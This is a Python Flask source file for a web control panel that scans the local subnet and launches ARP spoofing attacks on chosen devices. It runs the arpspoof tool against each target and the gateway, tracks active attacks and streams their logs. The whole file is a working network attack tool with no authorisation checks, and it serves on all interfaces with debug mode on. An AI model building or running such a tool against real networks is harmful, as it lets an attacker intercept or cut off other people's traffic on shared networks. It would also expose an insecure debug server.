from flask import Flask, render_template, jsonify, request, Response
import scanner
import threading
import time
import sys
import subprocess
import queue
import os

app = Flask(__name__)

# Global variables
active_attacks = {} # target_ip -> subprocess.Popen
log_queue = queue.Queue()
MAX_LOG_LINES = 50

def get_gateway_and_interface():
    """
    Attempts to find the default gateway and the interface it uses.
    Returns (gateway_ip, interface_name)
    """
    try:
        # Run 'ip route show default'
        # Output example: default via 192.168.1.1 dev eth0 proto dhcp src ...
        cmd = ["ip", "route", "show", "default"]
        output = subprocess.check_output(cmd).decode().strip()
        parts = output.split()
        gateway = parts[2]
        interface = parts[4]
        return gateway, interface
    except Exception as e:
        print(f"Error getting gateway: {e}")
        return "192.168.1.1", "eth0" # Fallback

def log_worker(target_ip, process):
    """
    Reads stderr/stdout from the process and pushes to log_queue
    """
    # arpspoof usually writes to stderr
    stream = process.stderr 
    
    while True:
        line = stream.readline()
        if not line and process.poll() is not None:
            break
        if line:
            msg = f"[{target_ip}] {line.decode('utf-8', errors='replace').strip()}"
            log_queue.put(msg)
            
            # Keep queue size manageable (simple approach)
            # In a real app, we might want per-client streams or a circular buffer
            pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan')
def scan_network():
    # Logic to get local ip to guess subnet
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    
    subnet = ".".join(IP.split('.')[:3]) + ".1/24"
    
    devices = scanner.scan(subnet)
    # Annotate active attacks
    for d in devices:
        if d['ip'] in active_attacks:
            d['is_attacked'] = True
        else:
            d['is_attacked'] = False
            
    return jsonify(devices)

@app.route('/attack', methods=['POST'])
def attack():
    data = request.json
    target_ip = data.get('target_ip')
    action = data.get('action') # start or stop
    
    if not target_ip:
        return jsonify({"status": "error", "message": "Target IP required"}), 400

    gateway, interface = get_gateway_and_interface()

    if action == 'start':
        if target_ip in active_attacks:
            return jsonify({"status": "error", "message": "Attack already running on this target"}), 400
        
        # Check for arpspoof
        try:
            subprocess.check_call(["which", "arpspoof"], stdout=subprocess.DEVNULL)
        except:
            return jsonify({"status": "error", "message": "arpspoof tool not found. Please install 'dsniff' package."}), 500

        # Start arpspoof
        # Command: arpspoof -i <interface> -t <target> <gateway>
        cmd = ["arpspoof", "-i", interface, "-t", target_ip, gateway]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[target_ip] = proc
            
            # Start log monitor thread
            t = threading.Thread(target=log_worker, args=(target_ip, proc))
            t.daemon = True
            t.start()
            
            log_queue.put(f"[SYSTEM] Attack started on {target_ip} via {interface} (Gateway: {gateway})")
            return jsonify({"status": "success", "message": f"Attack started on {target_ip}"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    elif action == 'stop':
        if target_ip in active_attacks:
            proc = active_attacks[target_ip]
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
            
            del active_attacks[target_ip]
            log_queue.put(f"[SYSTEM] Attack stopped on {target_ip}")
            return jsonify({"status": "success", "message": f"Attack stopped on {target_ip}"})
        else:
             return jsonify({"status": "error", "message": "No active attack found for this target"}), 404
    
    return jsonify({"status": "error", "message": "Invalid action"})

@app.route('/logs')
def get_logs():
    # Return all available logs in queue
    logs = []
    while not log_queue.empty():
        logs.append(log_queue.get())
    return jsonify(logs)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
